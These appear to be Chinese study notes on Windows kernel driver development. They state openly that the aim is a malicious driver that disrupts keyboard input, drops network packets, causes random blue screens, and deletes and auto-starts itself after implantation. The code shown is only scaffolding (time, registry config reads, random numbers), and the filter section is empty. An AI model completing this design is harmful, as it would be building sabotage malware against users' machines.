### Window 驱动开发：计算机正常操作干扰 -> 恶意软件

* 键盘 -> 干扰
* 网络 -> 丢包
* 随机蓝屏
* 植入之后，自销毁，自启动。

### 驱动开发流程

* DirveEntry 驱动入口
* 注册函数
* 绑定对象
* 驱动启动完成

### 相关函数

#### 	IoCreateDevice

```
函数用于创建一个新的设备对象

```

### 用户 设备对象 驱动 内核之间的关系

1. 用户：指使用计算机系统的人或程序。用户可以通过操作系统提供的接口来访问设备对象。

2. 设备对象：是计算机系统中的物理或逻辑设备，例如硬盘、键盘、鼠标等。操作系统通过设备对象来控制和管理这些设备。每个设备对象都有一个唯一的标识符，称为设备对象名。

3. 驱动：是操作系统中的软件模块，负责管理设备对象的操作。每个设备对象都需要一个相应的驱动程序来与其通信，以便控制和管理设备。驱动程序通常是由设备的制造商提供的，也可以由操作系统的开发者编写。

4. 内核：是操作系统的核心部分，负责管理系统资源、进程和线程、内存和文件系统等。内核提供了一组接口，使得驱动程序和用户程序可以与操作系统进行交互。驱动程序需要通过内核提供的接口来访问设备对象。

   用户通过操作系统提供的接口来访问设备对象，操作系统通过驱动程序来管理设备对象的操作，驱动程序通过内核提供的接口来与操作系统进行交互，以实现设备的控制和管理。

### 获取系统当前时间

```C
ULONG MyCurTimeStr()
{
	LARGE_INTEGER snow, now;
	TIME_FIELDS now_fields;
	static WCHAR time_str[32] = { 0 };
	// 获取标准时间
	KeQuerySystemTime(&snow);
	// 转换为当地时间
	ExSystemTimeToLocalTime(&snow, &now);
	// 转换为人们可以理解的时间要素
	RtlTimeToTimeFields(&snow, &now_fields);
	// 输出到日志中
	DbgPrint("%4d-%2d-%2d %2d-%2d-%2d",
		now_fields.Year, now_fields.Month, now_fields.Day,
		now_fields.Hour, now_fields.Minute, now_fields.Second);
	//now_fields.Day * 3600 * 24 +
	return (now_fields.Hour*3600 + now_fields.Minute*60 + now_fields.Second);
}
```

### 读取注册表

```C
NTSTATUS ReadRegistryDword()
{
	HANDLE my_key = NULL;
	NTSTATUS status;
	ULONG value = 0;
    UNICODE_STRING my_key_path = RTL_CONSTANT_STRING(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\services\\rtwlane");
	OBJECT_ATTRIBUTES my_obj_attr = { 0 };

	InitializeObjectAttributes(
		&my_obj_attr,
		&my_key_path,
		OBJ_CASE_INSENSITIVE,
		NULL,
		NULL);
	status = ZwOpenKey(&my_key, KEY_READ, &my_obj_attr);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("Failed to open registry key (%wZ): %x\n", my_key_path, status));
	}

	UNICODE_STRING my_key_name = RTL_CONSTANT_STRING(L"KeyControl");
	ULONG test = GetRand(my_key, my_key_name);
	if (test != STATUS_UNSUCCESSFUL)
	{
		rand_key = test;
	}

	DbgPrint("test %d \r\n", test);

	UNICODE_STRING my_key_name2 = RTL_CONSTANT_STRING(L"NetControl");
	test = GetRand(my_key, my_key_name2);
	if (test != STATUS_UNSUCCESSFUL)
	{
		rand_net = test;
	}
	DbgPrint("test %d \r\n", test);

	UNICODE_STRING my_key_name3 = RTL_CONSTANT_STRING(L"ErrControl");
	test = GetRand(my_key, my_key_name3);
	if (test != STATUS_UNSUCCESSFUL)
	{
		rand_error = test;
	}
	DbgPrint("test %d \r\n", test);

	ZwClose(my_key);

	return STATUS_SUCCESS;
}
```

### 伪随机数

```C
ULONG GeneralRand()
{
	g_rand = g_rand * 1103515245 + 12345;
	g_rand = ((ULONG)(g_rand / 65536) % 32768);
	return g_rand;
}
```

### 获取当前时间

```C
ULONG MyCurTimeStr()
{
	LARGE_INTEGER snow, now;
	TIME_FIELDS now_fields;
	static WCHAR time_str[32] = { 0 };
	KeQuerySystemTime(&snow);
	ExSystemTimeToLocalTime(&snow, &now);
	RtlTimeToTimeFields(&snow, &now_fields);
	DbgPrint("%4d-%2d-%2d %2d-%2d-%2d",
		now_fields.Year, now_fields.Month, now_fields.Day,
		now_fields.Hour, now_fields.Minute, now_fields.Second);
	//now_fields.Day * 3600 * 24 +
	return (now_fields.Hour*3600 + now_fields.Minute*60 + now_fields.Second);
}
//返回当天时间戳
```

### 键盘过滤和网络过滤

```

```

